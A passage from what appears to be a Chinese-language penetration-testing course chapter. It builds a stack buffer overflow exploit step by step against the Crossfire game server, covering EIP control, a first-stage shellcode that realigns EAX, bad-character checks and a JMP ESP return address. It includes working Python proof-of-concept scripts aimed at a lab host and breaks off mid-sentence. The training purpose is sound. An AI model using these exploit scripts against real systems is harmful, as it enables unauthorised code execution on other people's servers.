

## 12.3.1.1 练习
- 确定覆盖堆栈上返回地址所需的正确缓冲区偏移量。
- 更新你的独立脚本，以确保偏移量正确。

为了确认这个偏移量，我们将更新概念验证中的 `crash` 变量，以使用四个 "B" 字符干净地覆盖 EIP。

```
crash = "\x41" * 4368 + "B" * 4 + "C" * 7
```

列表 371 - 控制 EIP 寄存器

## 12.4 定位 shellcode 的空间

接下来，我们必须查找在崩溃时是否有指向我们缓冲区的寄存器。这一步至关重要，它允许我们随后尝试识别可能的 JMP 或 CALL 指令，以便将执行流重定向到我们的缓冲区。

我们注意到 ESP 寄存器（图 227）指向我们缓冲区的末尾，仅留下 7 个字节的空间用于 shellcode。此外，我们不能通过增加溢出缓冲区大小来获得更多空间；即使只增加一个字节，也会导致另一种不同的崩溃，无法正确覆盖 EIP。

![](img/ec25e59d75726b7041242a56d3376832_401_0.png)

图 227：ESP 指向我们缓冲区的末尾，仅为我们的 shellcode 留下 7 个字节的空间

更仔细地观察崩溃时寄存器的状态（图 227），可以发现更多选项。EAX 寄存器似乎指向我们缓冲区的开头，包括 "setup sound" 字符串。

EAX 直接指向命令字符串开头这一事实可能会影响我们简单地跳转到 EAX 所指向的缓冲区的能力，因为在我们执行 shellcode 之前，我们会先执行等同于 ASCII 字符串 "setup sound" 的十六进制操作码。这很可能会破坏执行路径并导致我们的利用程序失败。或者事实并非如此？

进一步检查 "setup sound" 字符串生成的实际操作码，显示出以下指令：

![](img/ec25e59d75726b7041242a56d3376832_402_0.png)

有趣的是，看起来操作码指令 s\x73) 和 e\x65)，即单词 "setup" 的前两个字母，转换成了*条件跳转*指令，似乎跳转到了我们受控缓冲区中的附近位置。单词 setup 的接下来两个字母 t\x74) 和 u\x75)，转换成了略有不同的条件跳转。所有这些跳转似乎都引导进入我们受控的缓冲区，因此在这种情况下跳转到 EAX 可能实际上对我们有用。然而，这并不是一个优雅解决方案，所以让我们*更努力地尝试*。

继续我们的分析，看起来在崩溃时 ESP 寄存器指向我们唯一缓冲区的末尾，但这只给我们提供了几字节的 shellcode 空间可供操作。我们可以尝试利用有限的空间创建一个第一阶段 shellcode。而不是实际的负载（如反向 shell），这个第一阶段 shellcode 将用于对齐 EAX 寄存器，使其指向 "setup sound" 字符串之后的缓冲区，然后跳转到该位置，从而允许我们跳过条件跳转。为了实现这一点，我们的第一阶段 shellcode 需要将 EAX 的值增加 12\x0C) 个字节，因为 "setup sound" 字符串包含 12 个字符。这可以使用 ADD 汇编指令完成，然后使用 JMP 指令跳转到由 EAX 指向的内存。

![](img/ec25e59d75726b7041242a56d3376832_403_0.png)

图 229. EAX 调整所需的字节数

为了获取指令的正确操作码，我们使用 Metasploit 中的 `msf-nasm_shell` 实用工具。

```
kali@kali:~$ msf-nasm_shell

nasm > add eax,12
00000000 83C00C              add eax,byte +0xc

nasm > jmp eax
00000000  FFE0                jmp eax
```

列表 372 - 获取第一阶段 shellcode 操作码

幸运的是，这两组指令 (\x83\xc0\x0c\xff\xe0) 只占用 5 个字节的内存。我们可以通过包含第一阶段 shellcode 并用 NOP (\x90) 重新填充原始缓冲区来保持正确的长度，从而更新概念验证。

```
#!/usr/bin/python
import socket

host = "10.11.0.128"

padding = "\x41" * 4368
eip = "\x42\x42\x42\x42"
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"

buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."

s.connect((host, 1337))
print s.recv(1024)

s.send(buffer)
s.close()
print "[*]PayLoad Sent !"
```

列表 373 - 添加第一阶段负载

运行更新后的概念验证代码后，我们可以验证 EIP 寄存器被四个 B (\x42) 覆盖，并且我们的第一阶段 shellcode 位于由 ESP 寄存器指向的内存地址：

![](img/ec25e59d75726b7041242a56d3376832_404_0.png)

图 230. 验证 ESP 指向第一阶段 shellcode 的开头

## 12.5 检查不良字符

为了发现任何可能破坏溢出或损坏我们 shellcode 的不良字符，我们可以使用与 Windows 缓冲区溢出模块中相同的方法。

我们在缓冲区中发送了从 00 到 0F 的整个字符范围，然后监测这些字节在被应用程序处理后，是否在内存中发生了变形、交换、丢失或改变。

多次运行概念验证并逐一排除不良字符后，我们得出了 Crossfire 应用程序的最终不良字符列表，这些字符似乎仅为 \x00 和 \x20。

### 12.5.1.1 练习
- 确定使用 msf-nasm\_shell 生成第一阶段 shellcode 所需的操作码。
- 识别不能包含在负载和返回地址中的不良字符。

## 12.6 查找返回地址

作为最后一步，我们需要找到一个有效的汇编指令，将代码执行重定向到 ESP 寄存器指向的内存位置。EDB 调试器附带一组插件，其中有一个名为 *OpcodeSearcher*。

![](img/ec25e59d75726b7041242a56d3376832_405_0.png)

图 231：EDB 的 *OpcodeSearcher* 插件

使用这个插件，我们可以轻松地在 crossfire 应用程序代码段映射的内存区域中搜索 JMP ESP 指令或等效指令：

![](img/ec25e59d75726b7041242a56d3376832_406_0.png)

![](img/ec25e59d75726b7041242a56d3376832_406_1.png)

*图 232：使用 EDB 查找任意汇编指令*

我们选择使用调试器找到的第一个 JMP ESP 指令 (0x8134596, 图 232) 继续操作。将覆盖偏移量、返回地址和第一阶段 shellcode 组合在一起，我们得到以下概念验证：

```
#!/usr/bin/python
import socket

host = "10.11.0.128"

padding = "\x41" * 4368
eip = "\x96\x45\x13\x08"
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"

buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."

s.connect((host, 1337))
print s.recv(1024)

s.send(buffer)
s.close()
print "[*]Payload Sent !"
```

*列表 374 - 在概念验证中添加返回地址*

在运行我们的概念验证之前，我们重启应用程序并再次将调试器附加到它。不是简单地让 Crossfire 进程运行，而是使用 EDB 断点管理器插件在我们的 JMP ESP 指令地址处设置断点。这将帮助我们确认 EIP 是否被正确覆盖。

![](img/ec25e59d75726b7041242a56d3376832_407_0.png)

设置好断点后，我们可以运行概念验证，如果一切按计划进行，我们的调试器应该在 JMP ESP 指令处停止。

![](img/ec25e59d75726b7041242a56d3376832_407_1.png)

断点已命中，我们继续单步执行 JMP ESP 指令，并落在我们的第一阶段 shellcode 上。

![](img/ec25e59d75726b7041242a56d3376832_408_0.png)

图 235：落在内存中的第一阶段 shellcode

执行第一条指令后，我们发现 EAX 寄存器现在指向我们受控缓冲区的开头，紧随 "setup sound" 字符串之后。

![](img/ec25e59d75726b7041242a56d3376832_408_1.png)

图 236：EAX 指向我们 A 缓冲区的开头

一旦 EAX 寄存器被我们的第一阶段 shellcode 对齐，一条 JMP EAX 指令就会将我们带入一个由 A 组成的干净缓冲区：

